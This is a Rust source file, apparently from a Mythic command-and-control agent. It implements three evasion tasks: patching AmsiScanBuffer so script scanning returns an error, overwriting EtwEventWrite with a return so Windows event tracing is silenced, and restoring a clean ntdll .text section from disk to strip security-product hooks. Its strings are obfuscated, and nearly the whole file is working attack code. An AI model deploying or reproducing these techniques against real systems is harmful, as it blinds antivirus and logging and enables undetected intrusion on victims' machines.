use crate::AgentTask;
use crate::mythic_success;
use crate::mythic_error;
use serde::Deserialize;
use std::error::Error;
use std::sync::mpsc;

/// Struct containing the unhook task parameters
#[derive(Deserialize)]
struct UnhookArgs {
    /// DLL to unhook (default: ntdll.dll)
    dll: Option<String>,
}

/// Patch AMSI in the current process to bypass script scanning
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn amsi_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    unsafe {
        // Resolve AmsiScanBuffer from amsi.dll
        let amsi_scan_buffer = match crate::winapi_resolve::resolve("amsi.dll", "AmsiScanBuffer") {
            Some(ptr) => ptr,
            None => {
                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve AmsiScanBuffer",
                    crate::obfstr::d(crate::obfstr::S_AMSI_FAIL))))?;
                return Ok(());
            }
        };

        // Resolve VirtualProtect from kernel32.dll
        type VirtualProtectFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            usize,
            u32,
            *mut u32,
        ) -> i32;

        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve VirtualProtect",
                    crate::obfstr::d(crate::obfstr::S_AMSI_FAIL))))?;
                return Ok(());
            }
        };

        // PAGE_EXECUTE_READWRITE = 0x40
        let mut old_protect: u32 = 0;

        // Make the function writable
        if virtual_protect(amsi_scan_buffer, 6, 0x40, &mut old_protect) == 0 {
            tx.send(mythic_error!(task.id, format!("{}: VirtualProtect failed",
                crate::obfstr::d(crate::obfstr::S_AMSI_FAIL))))?;
            return Ok(());
        }

        // Write the patch: mov eax, 0x80070057; ret (E_INVALIDARG)
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        std::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, 6);

        // Restore the original protection
        let mut tmp: u32 = 0;
        virtual_protect(amsi_scan_buffer, 6, old_protect, &mut tmp);

        tx.send(mythic_success!(task.id, format!("{}. AmsiScanBuffer patched successfully.",
            crate::obfstr::d(crate::obfstr::S_AMSI_PATCHED))))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn amsi_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, format!("amsi_patch {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
    Ok(())
}

/// Patch ETW to disable event tracing in the current process
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn etw_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    unsafe {
        // Resolve EtwEventWrite from ntdll.dll
        let etw_event_write = match crate::winapi_resolve::resolve("ntdll.dll", "EtwEventWrite") {
            Some(ptr) => ptr,
            None => {
                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve EtwEventWrite",
                    crate::obfstr::d(crate::obfstr::S_ETW_FAIL))))?;
                return Ok(());
            }
        };

        // Resolve VirtualProtect from kernel32.dll
        type VirtualProtectFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            usize,
            u32,
            *mut u32,
        ) -> i32;

        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{}: Failed to resolve VirtualProtect",
                    crate::obfstr::d(crate::obfstr::S_ETW_FAIL))))?;
                return Ok(());
            }
        };

        // PAGE_EXECUTE_READWRITE = 0x40
        let mut old_protect: u32 = 0;

        // Make the function writable
        if virtual_protect(etw_event_write, 1, 0x40, &mut old_protect) == 0 {
            tx.send(mythic_error!(task.id, format!("{}: VirtualProtect failed",
                crate::obfstr::d(crate::obfstr::S_ETW_FAIL))))?;
            return Ok(());
        }

        // Write the patch: ret (0xC3) - all ETW calls become no-ops
        let patch: u8 = 0xC3;
        std::ptr::write(etw_event_write as *mut u8, patch);

        // Restore the original protection
        let mut tmp: u32 = 0;
        virtual_protect(etw_event_write, 1, old_protect, &mut tmp);

        tx.send(mythic_success!(task.id, format!("{}. EtwEventWrite patched successfully.",
            crate::obfstr::d(crate::obfstr::S_ETW_PATCHED))))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn etw_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, format!("etw_patch {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
    Ok(())
}

/// Unhook a DLL by reloading a clean copy from disk
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn unhook(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    use std::ptr;

    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: UnhookArgs = serde_json::from_str(&task.parameters)?;

    let dll_name = args.dll.unwrap_or_else(|| "ntdll.dll".to_string());
    let dll_path = format!("C:\\Windows\\System32\\{}", dll_name);

    unsafe {
        // Resolve required functions
        type CreateFileAFn = unsafe extern "system" fn(*const i8, u32, u32, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
        type CreateFileMappingAFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, u32, *const i8) -> *mut std::ffi::c_void;
        type MapViewOfFileFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, u32, u32, usize) -> *mut std::ffi::c_void;
        type UnmapViewOfFileFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
        type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
        type GetModuleHandleAFn = unsafe extern "system" fn(*const i8) -> *mut std::ffi::c_void;

        let create_file_a = match crate::winapi_resolve::resolve("kernel32.dll", "CreateFileA") {
            Some(ptr) => std::mem::transmute::<_, CreateFileAFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve CreateFileA",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let create_file_mapping_a = match crate::winapi_resolve::resolve("kernel32.dll", "CreateFileMappingA") {
            Some(ptr) => std::mem::transmute::<_, CreateFileMappingAFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve CreateFileMappingA",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let map_view_of_file = match crate::winapi_resolve::resolve("kernel32.dll", "MapViewOfFile") {
            Some(ptr) => std::mem::transmute::<_, MapViewOfFileFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve MapViewOfFile",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let unmap_view_of_file = match crate::winapi_resolve::resolve("kernel32.dll", "UnmapViewOfFile") {
            Some(ptr) => std::mem::transmute::<_, UnmapViewOfFileFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve UnmapViewOfFile",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let close_handle = match crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
            Some(ptr) => std::mem::transmute::<_, CloseHandleFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve CloseHandle",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let virtual_protect = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect") {
            Some(ptr) => std::mem::transmute::<_, VirtualProtectFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve VirtualProtect",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let get_module_handle_a = match crate::winapi_resolve::resolve("kernel32.dll", "GetModuleHandleA") {
            Some(ptr) => std::mem::transmute::<_, GetModuleHandleAFn>(ptr),
            None => {
                tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to resolve GetModuleHandleA",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        // INVALID_HANDLE_VALUE = -1
        let invalid_handle_value = -1isize as *mut std::ffi::c_void;

        // Open the clean DLL file from disk
        // GENERIC_READ = 0x80000000, FILE_SHARE_READ = 0x1, OPEN_EXISTING = 3
        let path_c = CString::new(dll_path.as_str()).unwrap();
        let file_handle = create_file_a(
            path_c.as_ptr(),
            0x80000000,
            0x1,
            ptr::null_mut(),
            3,
            0,
            ptr::null_mut()
        );

        if file_handle == invalid_handle_value || file_handle.is_null() {
            tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to open file",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        // Create file mapping
        // PAGE_READONLY = 0x2
        let mapping_handle = create_file_mapping_a(
            file_handle,
            ptr::null_mut(),
            0x2,
            0,
            0,
            ptr::null()
        );

        if mapping_handle.is_null() {
            close_handle(file_handle);
            tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to create file mapping",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        // Map view of file
        // FILE_MAP_READ = 0x4
        let mapped_base = map_view_of_file(
            mapping_handle,
            0x4,
            0,
            0,
            0
        );

        if mapped_base.is_null() {
            close_handle(mapping_handle);
            close_handle(file_handle);
            tx.send(mythic_error!(task.id, format!("{} {} {}: Failed to map view of file",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        // Get the in-memory base address of the DLL
        let dll_name_c = CString::new(dll_name.as_str()).unwrap();
        let dll_base = get_module_handle_a(dll_name_c.as_ptr());

        if dll_base.is_null() {
            unmap_view_of_file(mapped_base);
            close_handle(mapping_handle);
            close_handle(file_handle);
            tx.send(mythic_error!(task.id, format!("{} {} {}: DLL not loaded in memory",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        // Parse PE headers to find .text section
        #[repr(C)]
        struct IMAGE_DOS_HEADER {
            e_magic: u16,
            _padding: [u8; 58],
            e_lfanew: i32,
        }

        #[repr(C)]
        struct IMAGE_NT_HEADERS {
            signature: u32,
            _file_header: [u8; 20],
            _optional_header: [u8; 224],
        }

        #[repr(C)]
        struct IMAGE_SECTION_HEADER {
            name: [u8; 8],
            virtual_size: u32,
            virtual_address: u32,
            size_of_raw_data: u32,
            pointer_to_raw_data: u32,
            _rest: [u8; 16],
        }

        let dos_header = &*(mapped_base as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D {
            unmap_view_of_file(mapped_base);
            close_handle(mapping_handle);
            close_handle(file_handle);
            tx.send(mythic_error!(task.id, format!("{} {} {}: Invalid PE file",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        let nt_headers = (mapped_base as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS;

        // Section headers come after NT headers
        let first_section = (nt_headers as usize + 4 + 20 + 224) as *const IMAGE_SECTION_HEADER;

        // Find .text section (typically the first section)
        let mut text_section: Option<&IMAGE_SECTION_HEADER> = None;
        for i in 0..10 {
            let section = &*first_section.offset(i);
            if section.name[0] == b'.' && section.name[1] == b't' && section.name[2] == b'e' && section.name[3] == b'x' && section.name[4] == b't' {
                text_section = Some(section);
                break;
            }
        }

        let section = match text_section {
            Some(s) => s,
            None => {
                unmap_view_of_file(mapped_base);
                close_handle(mapping_handle);
                close_handle(file_handle);
                tx.send(mythic_error!(task.id, format!("{} {} {}: .text section not found",
                    crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
                return Ok(());
            }
        };

        let text_va = section.virtual_address as usize;
        let text_size = section.virtual_size as usize;

        // Change memory protection to RW
        // PAGE_READWRITE = 0x04
        let mut old_protect: u32 = 0;
        let text_addr = (dll_base as usize + text_va) as *mut std::ffi::c_void;

        if virtual_protect(text_addr, text_size, 0x04, &mut old_protect) == 0 {
            unmap_view_of_file(mapped_base);
            close_handle(mapping_handle);
            close_handle(file_handle);
            tx.send(mythic_error!(task.id, format!("{} {} {}: VirtualProtect failed",
                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name, crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL))))?;
            return Ok(());
        }

        // Copy clean .text section over the hooked version
        let clean_text = (mapped_base as usize + text_va) as *const u8;
        let hooked_text = text_addr as *mut u8;
        ptr::copy_nonoverlapping(clean_text, hooked_text, text_size);

        // Restore to RX
        // PAGE_EXECUTE_READ = 0x20
        let mut tmp: u32 = 0;
        virtual_protect(text_addr, text_size, 0x20, &mut tmp);

        // Cleanup
        unmap_view_of_file(mapped_base);
        close_handle(mapping_handle);
        close_handle(file_handle);

        tx.send(mythic_success!(task.id, format!("{} {} {}. Copied {} bytes from clean .text section.\n\n{}",
            crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE), dll_name,
            crate::obfstr::d(crate::obfstr::S_UNHOOK_COMPLETE), text_size,
            crate::obfstr::d(crate::obfstr::S_UNHOOK_NOTE))))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn unhook(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, format!("unhook {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_unhook_args_parsing() {
        let json_args = r#"{"dll": "kernel32.dll"}"#;
        let args: UnhookArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.dll, Some("kernel32.dll".to_string()));
    }

    #[test]
    fn test_unhook_args_default() {
        let json_args = r#"{}"#;
        let args: UnhookArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.dll, None);
    }
}
